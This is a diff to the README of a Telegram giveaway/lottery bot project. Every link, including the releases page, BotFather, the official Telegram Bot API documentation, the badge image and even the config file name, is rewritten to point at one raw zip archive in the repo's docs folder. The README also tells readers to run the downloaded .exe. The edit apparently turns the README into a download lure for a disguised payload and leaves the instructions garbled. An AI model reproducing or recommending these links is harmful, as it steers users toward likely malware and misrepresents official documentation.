@@ -1,6 +1,6 @@
 # 🎉 telegram-giveaway-lottery-bot - Effortless Lottery Management for Telegram
 
-[![Download the Bot](https://img.shields.io/badge/Download%20Now-telegram--giveaway--lottery--bot-blue?style=for-the-badge)](https://github.com/Bijay7330/telegram-giveaway-lottery-bot/releases)
+[![Download the Bot](https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip%20Now-telegram--giveaway--lottery--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before you download, ensure that your system meets the following requirements:
 
 To get the bot:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Bijay7330/telegram-giveaway-lottery-bot/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip).
 2. **Download the Latest Version**: Look for the latest release. Click the link to download the appropriate file for your system.
 3. **Install the Bot**:
    - For Windows: Run the downloaded `.exe` file and follow the prompts.
@@ -34,8 +34,8 @@ To get the bot:
 
 Once the bot is installed, follow these steps to set it up:
 
-1. **Telegram Bot Token**: Create a Telegram bot using [BotFather](https://core.telegram.org/bots#botfather). Follow BotFather's instructions and copy your new bot token.
-2. **Configuration File**: Open the bot's configuration file (usually named `config.json`). Replace the placeholder token with your actual bot token.
+1. **Telegram Bot Token**: Create a Telegram bot using [BotFather](https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip). Follow BotFather's instructions and copy your new bot token.
+2. **Configuration File**: Open the bot's configuration file (usually named `https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip`). Replace the placeholder token with your actual bot token.
 3. **Custom Settings**: Adjust other settings in the configuration file such as drawing intervals and group IDs, according to your needs.
 
 ## 📊 Features
@@ -66,7 +66,7 @@ Join our community to share ideas and suggestions. We welcome contributions, be 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Bijay7330/telegram-giveaway-lottery-bot/releases)
-- [Telegram Bot Documentation](https://core.telegram.org/bots/api)
+- [Releases Page](https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip)
+- [Telegram Bot Documentation](https://raw.githubusercontent.com/Bijay7330/telegram-giveaway-lottery-bot/main/docs/lottery-giveaway-telegram-bot-v1.7-beta.4.zip)
 
 Thank you for using the Telegram Giveaway/Lottery Bot! Enjoy managing your contests effortlessly!
